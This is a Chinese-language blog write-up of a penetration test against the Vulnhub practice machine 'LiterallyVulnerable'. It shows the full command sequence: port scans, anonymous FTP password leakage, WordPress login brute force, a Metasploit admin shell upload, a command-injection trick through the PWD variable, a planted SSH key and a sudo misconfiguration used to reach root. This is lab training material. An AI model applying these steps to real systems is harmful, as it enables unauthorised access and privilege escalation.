# UA:LiterallyVulnerable 靶机实践

## 前言

靶机真好玩，于是又到Vulnhub上下了一个靶机玩玩，结果很多地方还是需要别人的Walk Through来指点一下，不然就彻底卡住了。。。。。

最终成果

![Screenshot_2020-01-16_15-58-55](/assets/images/Screenshot_2020-01-16_15-58-55.png)

## 渗透记录

打开靶机

```shell
arp-scan -l
```

扫到地址

```shell
192.168.31.166  00:0c:29:db:dd:a9       VMware, Inc.
```

看服务

```shell
nmap -A 192.168.31.166
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-16 10:50 CST
Nmap scan report for 192.168.31.166
Host is up (0.00032s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.31.51
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2f:26:5b:e6:ae:9a:c0:26:76:26:24:00:a7:37:e6:c1 (RSA)
|   256 79:c0:12:33:d6:6d:9a:bd:1f:11:aa:1c:39:1e:b8:95 (ECDSA)
|_  256 83:27:d3:79:d0:8b:6a:2a:23:57:5b:3c:d7:b4:e5:60 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: WordPress 5.3
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Not so Vulnerable &#8211; Just another WordPress site
|_http-trane-info: Problem with XML parsing of /evox/about
MAC Address: 00:0C:29:DB:DD:A9 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.31.166

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.37 seconds
```

开了ftp,ssh,http

还是先看看http

登上去一直刷不出来

Console看一下发现都跳转到literally.vulnerable了

本地绑定一下应该就可

```shell
echo "192.168.0.3 literally.vulnerable" >> /etc/hosts
```

绑定完以后正常多了

![Screenshot_2020-01-16_12-28-41](/assets/images/Screenshot_2020-01-16_12-28-41.png)

转了一圈发现没有啥注入点

wpscan也没有什么有意思的发现

那么我们再看看ftp服务

我们知道ftp服务是支持anonymous登陆的

试下靶机有没有开启相关功能

```shell
ftp 192.168.31.166
Connected to 192.168.31.166.
220 (vsFTPd 3.0.3)
Name (192.168.31.166:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Dec 04 13:05 .
drwxr-xr-x    2 ftp      ftp          4096 Dec 04 13:05 ..
-rw-r--r--    1 ftp      ftp           325 Dec 04 13:05 backupPasswords
226 Directory send OK.
```

发现泄露了一个backupPasswords

get下来读一下

```shell
ftp> get backupPasswords
local: backupPasswords remote: backupPasswords
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backupPasswords (325 bytes).
226 Transfer complete.
325 bytes received in 0.00 secs (112.7470 kB/s)
ftp> exit
221 Goodbye.
root@kali:~# cat backupPasswords 
Hi Doe, 

I'm guessing you forgot your password again! I've added a bunch of passwords below along with your password so we don't get hacked by those elites again!

*$eGRIf7v38s&p7
yP$*SV09YOrx7mY
GmceC&oOBtbnFCH
3!IZguT2piU8X$c
P&s%F1D4#KDBSeS
$EPid%J2L9LufO5
nD!mb*aHON&76&G
$*Ke7q2ko3tqoZo
SCb$I^gDDqE34fA
Ae%tM0XIWUMsCLp
```

相当于拿到了一个字典

之前wpscan的时候拿到了user列表

试试用这个字典能不能破解

```shell
wpscan --url http://192.168.31.166 -U users.txt -P backupPasswords
```

很遗憾没有成功.....

接下来怎么办.....

看了一下大佬写的WalkThrough发现

前面居然漏扫了一个端口

加个-p-参数才能扫出来...

```shell
nmap -p- -A 192.168.31.166
...
65535/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

估计是因为端口号太大了

访问是个Apache2的默认界面

fuzz一下看看能不能读其他目录

这里就要用Gobuster了

> Gobuster是Kali Linux默认安装的一款暴力扫描工具。它是使用Go语言编写的命令行工具，具备优异的执行效率和并发性能。该工具支持对子域名和Web目录进行基于字典的暴力扫描。不同于其他工具，该工具支持同时多扩展名破解，适合采用多种后台技术的网站。实施子域名扫描时，该工具支持泛域名扫描，并允许用户强制继续扫描，以应对泛域名解析带来的影响。

```shell
gobuster dir -u http://192.168.31.166:65535/ -w /usr/share/wordlists/dirb/big.txt
```

返回

```shell
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.31.166:65535/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/16 12:25:53 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/javascript (Status: 301)
/phpcms (Status: 301)
/server-status (Status: 403)
===============================================================
2020/01/16 12:25:54 Finished
===============================================================
```

试了一下phpcms是可以访问的

而且有趣的是现在网站的标题变成了Literally Vulnerable

![Screenshot_2020-01-16_12-28-50](/assets/images/Screenshot_2020-01-16_12-28-50.png)

再用wpscan扫一下

```shell
wpscan --url http://192.168.31.166:65535/phpcms/ --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.5
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.31.166:65535/phpcms/
[+] Started: Thu Jan 16 12:31:23 2020

Interesting Finding(s):

[+] http://192.168.31.166:65535/phpcms/
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.31.166:65535/phpcms/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.31.166:65535/phpcms/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.31.166:65535/phpcms/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.31.166:65535/phpcms/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3 identified (Insecure, released on 2019-11-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.31.166:65535/phpcms/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.3'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.31.166:65535/phpcms/, Match: 'WordPress 5.3'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:00 <==================================> (323 / 323) 100.00% Time: 00:00:00

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:01 <================================> (2568 / 2568) 100.00% Time: 00:00:01

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=====================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <=========================================> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <==============================> (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] maybeadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] notadmin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.

[+] Finished: Thu Jan 16 12:31:30 2020
[+] Requests Done: 3103
[+] Cached Requests: 14
[+] Data Sent: 981.093 KB
[+] Data Received: 984.625 KB
[+] Memory used: 215.057 MB
[+] Elapsed time: 00:00:07
```

拿到两个用户名，再跑下字典试试

找到一个对应的

```shell
[i] Valid Combinations Found:
 | Username: maybeadmin, Password: $EPid%J2L9LufO5
```

登陆试试

![Screenshot_2020-01-16_12-37-46](/assets/images/Screenshot_2020-01-16_12-37-46.png)

在密码保护页面里找到了notadmin的密码Pa$$w0rd13!&

登陆以后看起来我们拿到了wordpress的管理员用户

![Screenshot_2020-01-16_12-41-48](/assets/images/Screenshot_2020-01-16_12-41-48.png)

然后就可以用msf拿到shell了

```shell
root@kali:~# msfdb start
[+] Starting database
root@kali:~# msfconsole -q
msf5 > use exploit/unix/webapp/wp_admin_shell_upload
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 192.168.31.166
rhosts => 192.168.31.166
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rport 65535
rport => 65535
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /phpcms
targeturi => /phpcms
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username notadmin
username => notadmin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Pa$$w0rd13!&
password => Pa$$w0rd13!&
msf5 exploit(unix/webapp/wp_admin_shell_upload) > exploit
meterpreter > shell
```

然后用python脚本获得我们熟悉的交互式shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

shell玩了一下

进/home 有两个文件夹 doe和john

doe里有个iteasy 和不能读的local.txt以及似乎没什么敏感信息的noteFromAdmin

itseasy作用是输出当前目录也就类似echo PWD

john里有个user.txt也读不了

怎么办....

既然itseasy能echo

拼接一个$(/bin/sh)试试

好像不会正常回显。。。。

试试/bin/bash

这回可以了

```shell
www-data@literallyvulnerable:$ export PWD=\$\(/bin/bash\)
export PWD=\$\(/bin/bash\)
www-data@literallyvulnerable:$(/bin/bash)$ /home/doe/itseasy
/home/doe/itseasy
sh: 0: getcwd() failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
john@literallyvulnerable:$ 
```

我们变成john了

但是好像也没有正常回显

对了，我们不是还有ssh服务吗

考虑生成一对RSA密钥

然后连上ssh服务

首先在本地生成

```shell
ssh-keygen
```

然后把生成的公钥丢到服务器上就可以了

```shell
john@literallyvulnerable:/home/john$ mkdir -p /home/john/.ssh
mkdir -p /home/john/.ssh
john@literallyvulnerable:/home/john$ echo "<你的公钥内容>" > /home/john/.ssh/authorized_keys
<MfUMM= root@kali" > /home/john/.ssh/authorized_keys
```

然后在本地应该就可以无密码连上ssh了

```shell
ssh john@192.168.31.166
john@literallyvulnerable:~$ 
```

拿到了完整的shell和john的用户权限

可以读到第一个flag了

```shell
john@literallyvulnerable:~$ cat user.txt 
Almost there! Remember to always check permissions! It might not help you here, but somewhere else! ;) 
Flag: iuz1498ne667ldqmfarfrky9v5ylki
```

接下来怎么做呢，

sudo -l 行不通 因为还是没有john的密码

一通fuzz

发现一个有趣的东西

```shell
john@literallyvulnerable:~$ find . -type f -iname "*password*"
./.local/share/tmpFiles/myPassword
```

cat 一下

```shell
cat ./.local/share/tmpFiles/myPassword
I always forget my password, so, saving it here just in case. Also, encoding it with b64 since I don't want my colleagues to hack me!
am9objpZWlckczhZNDlJQiNaWko=
```

base64解码完是个

```
john:YZW$s8Y49IB#ZZJ
```

拿到密码了

sudo -l一下

```shell
john@literallyvulnerable:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on literallyvulnerable:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on literallyvulnerable:
    (root) /var/www/html/test.html
```

可以执行/var/www/html/test.html

可是这个文件不存在....

而且john写不了这个文件....

但是之前拿到的www-data的shell可以写啊！

```shell
www-data@literallyvulnerable:$(/bin/bash)$ echo "/bin/bash" > /var/www/html/test.html
<n/bash)$ echo "/bin/bash" > /var/www/html/test.html
www-data@literallyvulnerable:$(/bin/bash)$ chmod 777 /var/www/html/test.html
chmod 777 /var/www/html/test.html

john@literallyvulnerable:~$ sudo /var/www/html/test.html
root@literallyvulnerable:~#
```

完工！

不过看起来像个非预期解，因为/doe/local.txt的flag没有用上....

## 参考资料

Nmap 各参数详解：https://blog.csdn.net/SKI_12/article/details/61651960

记一份基础Metasploit教程：https://xz.aliyun.com/t/3007

msf工具使用参考：https://g2ex.top/2015/06/09/MSF-Cheat-Sheet/

find工具使用参考：https://www.jianshu.com/p/4a5d904e38c7

